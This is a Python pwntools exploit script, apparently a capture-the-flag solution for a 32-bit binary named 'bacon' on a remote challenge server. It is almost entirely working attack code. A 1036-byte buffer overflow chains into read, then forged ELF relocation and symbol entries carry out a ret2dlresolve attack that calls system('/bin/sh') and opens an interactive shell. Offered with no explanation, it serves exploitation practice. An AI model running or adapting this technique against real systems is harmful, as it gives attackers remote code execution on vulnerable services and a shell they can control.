from pwn import *
import sys
from LibcSearcher import LibcSearcher


#MyTemplate
program = 'bacon'
elf = ELF(program)
lokal = False
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = "a"
    r = process('./bacon')
    #libc = elf.libc
else:
    host = 'jh2i.com'
    port = '50032'
    r = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *_dl_runtime_resolve \n c"
    gdb.attach(r,cmd)

#Exploit Here

offset = 1036
bss = elf.bss()
base = bss + 0x900

fake_frame = base + 0x80
rel_plt_addr = 0x08048408
strtab_addr, symtab_addr, JMPREL = map(elf.dynamic_value_by_tag,["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL"])

read_plt_addr = elf.plt['read']
read_got_addr = elf.got['read']
dlresolve_addr = 0x8049030


p = "B"*(1036)
p += p32(0x08049040) #read
p += p32(0x0804925d) #vuln
p += p32(0)
p += p32(base)
p += p32(0x1000)
p = p.ljust(1068,"B")

r.send(p)

def align_sym_addr(rel_offset, symtab_addr):
    sym_addr = rel_offset + 0x8 - symtab_addr
    align = 0x10 - sym_addr & 0xf
    sym_addr = align + sym_addr
    return sym_addr + symtab_addr


fake_base = fake_frame
fake_rel_offset = fake_base - rel_plt_addr
# and we could fulfill r_offset with read_got
# then we calc the r_info
log.info("fake_base is %x"%fake_base)
fake_sym_addr = align_sym_addr(fake_base, symtab_addr)
log.info("fake_sym_info is %x"%fake_sym_addr)
fake_r_info = (((fake_sym_addr - symtab_addr) / 0x10 ) << 8 )| 0x7
log.info("fake_r_info is %x, high index is %x, and low is %x"%(fake_r_info, fake_r_info >> 8, fake_r_info &0xff))
# finally, we could write system address at here
# fake_st_addr is "system", and fake_st_addr + 0x8 is "/bin/sh"
fake_st_addr = fake_sym_addr + 0x10
bin_addr = fake_st_addr + 0x8
log.info("bin_addr is %x"%bin_addr)
fake_st_addr = fake_st_addr - strtab_addr


buf = ""
buf += "AAAA"
buf += p32(dlresolve_addr)
buf += p32(fake_rel_offset)
buf += p32(read_plt_addr)
buf += p32(bin_addr)
buf += (0x80 - len(buf))*'a'

# fake_Elf32_Rel
buf += p32(read_got_addr)
buf += p32(fake_r_info)

# and we put some padding
buf += (fake_sym_addr - (base + 0x80 + 8))*'a'

# fake_Elf32_Sym
buf += p32(fake_st_addr)
buf += p32(0)
buf += p32(0)
buf += p32(12)

# finally, we put "system" and "/bin/sh"
buf += "system\x00\x00"
buf += "/bin/sh\x00"

r.send(buf)

log.info("succes! we wait for finally")
raw_input()


p = "A"*1036
p += p32(0x08049323)
p += p32(base)
p += p32(0x08049126) #leave


r.sendline(p)



r.interactive()
